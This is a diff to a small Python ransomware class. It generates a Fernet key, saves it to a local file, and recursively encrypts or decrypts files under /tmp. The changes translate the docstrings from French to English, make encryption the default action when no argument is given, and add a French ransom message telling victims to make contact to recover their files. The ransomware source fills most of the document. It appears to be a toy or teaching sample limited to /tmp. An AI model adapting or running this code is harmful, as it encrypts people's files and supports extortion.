@@ -24,7 +24,7 @@ class Ransomware:
 
     def generate_key(self):
         """
-        Génération d'une clé AES 128 pour chiffrer les fichiers. Utilisation des objets Fernet.
+        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
         """
 
         self.key = Fernet.generate_key()
@@ -33,9 +33,10 @@ class Ransomware:
     
     def read_key(self, keyfile_name):
         """
-        Lis la clé contenue dans le fichier placé en argument
+        Reads in a key from a file.
 
-        Args: keyfile_name Chemin jusqu'à l'emplacement de la clé de secrète.
+        Args:
+            keyfile_name:str: Path to the file containing the key
         """
 
         with open(keyfile_name, 'rb') as f:
@@ -45,7 +46,7 @@ class Ransomware:
 
     def write_key(self, keyfile_name):
         """
-        Ecrit la clé créée dans un fichier
+        Writes the key to a keyfile
         """
 
         print(self.key)
@@ -55,7 +56,7 @@ class Ransomware:
 
     def crypt_tmp(self, tmp_dir, encrypted=False):
         """
-        Chiffre ou déchiffre récursivement les fichier de /tmp avec les extensions autorisées (ici .txt)
+        Recursively encrypts or decrypts files from tmp directory with allowed file extensions
 
         Args:
             tmp_dir:str: Absolute path of top level directory
@@ -100,15 +101,15 @@ class Ransomware:
 
 
 if __name__ == '__main__':
-    # sys_root = expanduser('/tmp')
-    local_tmp = '/tmp'
+
+    local_tmp = '/tmp' # emplacement dossier à chiffrer
 
     #rware.generate_key()
     #rware.write_key()
 
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument('--action', required=True)
+    parser.add_argument('--action')# , required=True
     parser.add_argument('--keyfile')
 
     args = parser.parse_args()
@@ -119,11 +120,12 @@ if __name__ == '__main__':
 
     if action == 'decrypt':
         if keyfile is None:
-            print('Path to keyfile must be specified after --keyfile to perform decryption.')
+            print('Veuillez spécifier le fichier de clé avec --keyfile')
         else:
             rware.read_key(keyfile)
             rware.crypt_tmp(local_tmp, encrypted=True)
-    elif action == 'encrypt':
+    else: #action == 'encrypt'
+        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp")    
         rware.generate_key()
         rware.write_key('keyfile')
         rware.crypt_tmp(local_tmp)
